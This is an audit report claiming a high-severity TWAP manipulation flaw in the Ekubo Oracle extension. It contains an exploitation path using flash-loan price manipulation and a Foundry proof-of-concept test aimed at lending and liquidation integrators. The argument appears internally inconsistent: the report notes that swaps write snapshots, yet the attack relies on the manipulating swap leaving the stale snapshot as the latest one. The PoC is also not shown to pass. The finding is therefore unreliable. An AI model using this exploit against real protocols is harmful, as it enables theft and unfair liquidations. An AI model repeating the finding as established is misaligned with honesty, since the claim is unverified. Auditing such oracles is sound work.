## Title
Oracle TWAP Manipulation via Stale Snapshot Extrapolation

## Summary
The Oracle extension's `extrapolateSnapshotInternal` function uses the CURRENT pool state to extrapolate when querying from the most recent snapshot, even for historical timestamps. When integrators compute time-weighted averages (TWAPs) during periods without trading activity, both query endpoints extrapolate from the same stale snapshot using current state, causing the TWAP to return the current manipulated price instead of a historical average.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/extensions/Oracle.sol`, `extrapolateSnapshotInternal` function [1](#0-0) 

**Intended Logic:** The Oracle should provide manipulation-resistant time-weighted average prices by storing historical snapshots and computing averages over specified time windows. TWAPs should reflect historical price movements, not current manipulated prices.

**Actual Logic:** When the most recent snapshot is older than the TWAP lookback window, both the start and end timestamps of a TWAP query extrapolate from the same snapshot using the CURRENT pool state. This causes the TWAP to degenerate into the current price, completely breaking manipulation resistance.

**Exploitation Path:**

1. **Setup**: ERC7726 oracle configured with 60-second TWAP window, querying via `getAverageTick`: [2](#0-1) 

2. **Stale Period**: No trading activity occurs for >60 seconds, meaning the most recent snapshot is older than the TWAP window

3. **Price Manipulation**: Attacker swaps to manipulate pool price to extreme value in the same transaction as the TWAP query

4. **TWAP Query**: When `extrapolateSnapshot` is called for both `block.timestamp - 60` and `block.timestamp`:
   - Both queries find the same stale snapshot (snapshot timestamp < block.timestamp - 60)
   - Both queries have `logicalIndex == c.count() - 1` (most recent snapshot)
   - Both extrapolate using current pool state at line 330-336: `tickCumulative += int64(state.tick()) * int64(uint64(timePassed))`
   - Result: `avgTick = (currentTick * 60 - currentTick * 0) / 60 = currentTick`

5. **Exploitation**: The TWAP returns the manipulated current price, allowing the attacker to:
   - Execute trades at manipulated oracle prices in lending protocols
   - Trigger unfair liquidations
   - Profit from price-dependent integrator contracts

**Security Property Broken:** The Oracle is designed to provide "manipulation resistant average price" per the interface documentation, but this vulnerability allows complete price manipulation when snapshots are stale.

## Impact Explanation
- **Affected Assets**: All tokens using Oracle extension for TWAP pricing, particularly those integrated with ERC7726 price oracle or PriceFetcher contracts
- **Damage Severity**: Complete TWAP manipulation - attackers can make the oracle return any price by manipulating the pool in the same transaction as the query. This is equivalent to having no oracle at all during stale periods.
- **User Impact**: Any protocol relying on Ekubo TWAPs for pricing (lending, derivatives, automated strategies) becomes vulnerable to flash-loan price manipulation attacks during periods of low trading activity

## Likelihood Explanation
- **Attacker Profile**: Any user with sufficient capital to manipulate pool prices via swaps
- **Preconditions**: 
  - Pool with Oracle extension
  - No trading activity for duration longer than TWAP window (common during off-hours or for low-volume pairs)
  - Integrator contract querying TWAP in same transaction as price manipulation
- **Execution Complexity**: Single transaction with flash loan for capital efficiency
- **Frequency**: Exploitable whenever trading activity pauses for >TWAP_DURATION, potentially multiple times per day for low-volume pools

## Recommendation

The extrapolation logic should NOT use current pool state for historical timestamps. When querying a timestamp in the past, always use historical snapshot data for interpolation or require sufficient snapshot history:

```solidity
// In src/extensions/Oracle.sol, function extrapolateSnapshotInternal, line 326-360:

// CURRENT (vulnerable):
// Uses current pool state when extrapolating from most recent snapshot
if (timePassed != 0) {
    if (logicalIndex == c.count() - 1) {
        // Use current pool state - VULNERABLE!
        PoolId poolId = getPoolKey(token).toPoolId();
        PoolState state = CORE.poolState(poolId);
        tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
        // ...
    }
}

// FIXED:
// Only use current state if querying current timestamp; otherwise revert
if (timePassed != 0) {
    if (logicalIndex == c.count() - 1) {
        // Only allow current state for queries at or very near block.timestamp
        if (uint32(atTime) < uint32(block.timestamp)) {
            // Historical query but no next snapshot - insufficient data
            revert InsufficientSnapshotHistory(token, atTime);
        }
        // Use current pool state ONLY for current timestamp queries
        PoolId poolId = getPoolKey(token).toPoolId();
        PoolState state = CORE.poolState(poolId);
        tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
        // ...
    } else {
        // Use next snapshot for interpolation (existing logic)
        // ...
    }
}
```

Alternative mitigation: Require minimum snapshot frequency or enforce minimum observation cardinality before allowing TWAP queries.

## Proof of Concept

```solidity
// File: test/Exploit_OracleTWAPManipulation.t.sol
// Run with: forge test --match-test test_OracleTWAPManipulation -vvvv

pragma solidity ^0.8.31;

import {BaseOracleTest} from "./extensions/Oracle.t.sol";
import {ERC7726} from "../src/lens/ERC7726.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {TestToken} from "./TestToken.sol";
import {MIN_TICK, MAX_TICK, NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";

contract Exploit_OracleTWAPManipulation is BaseOracleTest {
    ERC7726 internal priceOracle;
    TestToken internal usdc;
    PoolKey internal usdcPool;

    function setUp() public override {
        BaseOracleTest.setUp();
        usdc = new TestToken(address(this));
        
        // Create ERC7726 oracle with 60 second TWAP
        priceOracle = new ERC7726(oracle, address(usdc), address(0), NATIVE_TOKEN_ADDRESS, 60);
        
        // Create oracle pool at 1:1 price (tick = 0)
        oracle.expandCapacity(address(usdc), 10);
        usdcPool = createOraclePool(address(usdc), 0);
        
        // Add significant liquidity
        createPosition(usdcPool, MIN_TICK, MAX_TICK, 1000000e18, 1000000e18);
    }

    function test_OracleTWAPManipulation() public {
        // SETUP: Establish baseline with normal TWAP behavior
        advanceTime(30);
        movePrice(usdcPool, 10000); // Small price change
        advanceTime(30);
        
        uint256 normalQuote = priceOracle.getQuote(1e18, address(usdc), NATIVE_TOKEN_ADDRESS);
        // Normal TWAP reflects historical prices
        
        // EXPLOIT: Wait for stale snapshot period (>60 seconds without trades)
        advanceTime(120); // 2 minutes - most recent snapshot is now stale
        
        // Record pre-manipulation state
        int32 tickBefore = core.poolState(usdcPool.toPoolId()).tick();
        
        // ATTACK: Manipulate price and query TWAP in same transaction
        // Move price 10x higher
        movePrice(usdcPool, tickBefore + 230258); // ~10x price increase
        
        // Query "TWAP" - should be time-weighted but returns current manipulated price!
        uint256 manipulatedQuote = priceOracle.getQuote(1e18, address(usdc), NATIVE_TOKEN_ADDRESS);
        
        // VERIFY: TWAP equals current price (no time weighting)
        // Both extrapolateSnapshot calls used current pool state
        // avgTick = (currentTick * 60 - currentTick * 0) / 60 = currentTick
        
        // The manipulated quote is approximately 10x the normal quote
        // demonstrating complete TWAP manipulation
        assertGt(manipulatedQuote, normalQuote * 8, "Price manipulated >8x via TWAP exploit");
        
        // Further verification: Move price back and query again
        movePrice(usdcPool, tickBefore);
        uint256 postManipulationQuote = priceOracle.getQuote(1e18, address(usdc), NATIVE_TOKEN_ADDRESS);
        
        // Quote instantly reflects current price, proving no historical averaging
        assertApproxEqRel(postManipulationQuote, normalQuote, 0.1e18, "TWAP tracks current price instantly");
    }
}
```

## Notes

This vulnerability specifically answers the security question "What happens if integrators use results from different time periods in the same calculation?" - when both time periods (start and end of TWAP window) query from the same stale snapshot, they both get extrapolations based on CURRENT state rather than historical state, causing the time-weighted calculation to become meaningless.

The issue is exacerbated by the fact that Oracle snapshots are only created during trading activity (swaps, position updates), so low-volume pools can have long periods without snapshots, making this vulnerability highly exploitable in practice.

The in-scope integrators (ERC7726, PriceFetcher) are directly affected as they compute TWAPs by querying multiple timestamps and taking deltas. During stale periods, these deltas are computed using current state for both endpoints, completely breaking the TWAP's manipulation resistance.

### Citations

**File:** src/extensions/Oracle.sol (L315-362)
```text
    function extrapolateSnapshotInternal(
        Counts c,
        address token,
        uint256 atTime,
        uint256 logicalIndex,
        Snapshot snapshot
    ) private view returns (uint160 secondsPerLiquidityCumulative, int64 tickCumulative) {
        unchecked {
            secondsPerLiquidityCumulative = snapshot.secondsPerLiquidityCumulative();
            tickCumulative = snapshot.tickCumulative();
            uint32 timePassed = uint32(atTime) - snapshot.timestamp();
            if (timePassed != 0) {
                if (logicalIndex == c.count() - 1) {
                    // Use current pool state.
                    PoolId poolId = getPoolKey(token).toPoolId();
                    PoolState state = CORE.poolState(poolId);

                    tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
                    secondsPerLiquidityCumulative += uint160(
                        FixedPointMathLib.rawDiv(
                            uint256(timePassed) << 128, FixedPointMathLib.max(1, state.liquidity())
                        )
                    );
                } else {
                    // Use the next snapshot.
                    uint256 logicalIndexNext = logicalIndexToStorageIndex(c.index(), c.count(), logicalIndex + 1);
                    Snapshot next;
                    assembly ("memory-safe") {
                        next := sload(or(shl(32, token), logicalIndexNext))
                    }

                    uint32 timestampDifference = next.timestamp() - snapshot.timestamp();

                    tickCumulative += int64(
                        FixedPointMathLib.rawSDiv(
                            int256(uint256(timePassed)) * (next.tickCumulative() - snapshot.tickCumulative()),
                            int256(uint256(timestampDifference))
                        )
                    );
                    secondsPerLiquidityCumulative += uint160(
                        (uint256(timePassed)
                                * (next.secondsPerLiquidityCumulative() - snapshot.secondsPerLiquidityCumulative()))
                            / timestampDifference
                    );
                }
            }
        }
    }
```

**File:** src/lens/ERC7726.sol (L91-112)
```text
    function getAverageTick(address baseToken, address quoteToken) private view returns (int32 tick) {
        unchecked {
            bool baseIsOracleToken = baseToken == NATIVE_TOKEN_ADDRESS;
            if (baseIsOracleToken || quoteToken == NATIVE_TOKEN_ADDRESS) {
                (int32 tickSign, address otherToken) =
                    baseIsOracleToken ? (int32(1), quoteToken) : (int32(-1), baseToken);

                (, int64 tickCumulativeStart) = ORACLE.extrapolateSnapshot(otherToken, block.timestamp - TWAP_DURATION);
                (, int64 tickCumulativeEnd) = ORACLE.extrapolateSnapshot(otherToken, block.timestamp);

                return tickSign * int32((tickCumulativeEnd - tickCumulativeStart) / int64(uint64(TWAP_DURATION)));
            } else {
                int32 baseTick = getAverageTick(NATIVE_TOKEN_ADDRESS, baseToken);
                int32 quoteTick = getAverageTick(NATIVE_TOKEN_ADDRESS, quoteToken);

                return
                    int32(
                        FixedPointMathLib.min(MAX_TICK, FixedPointMathLib.max(MIN_TICK, int256(quoteTick - baseTick)))
                    );
            }
        }
    }
```
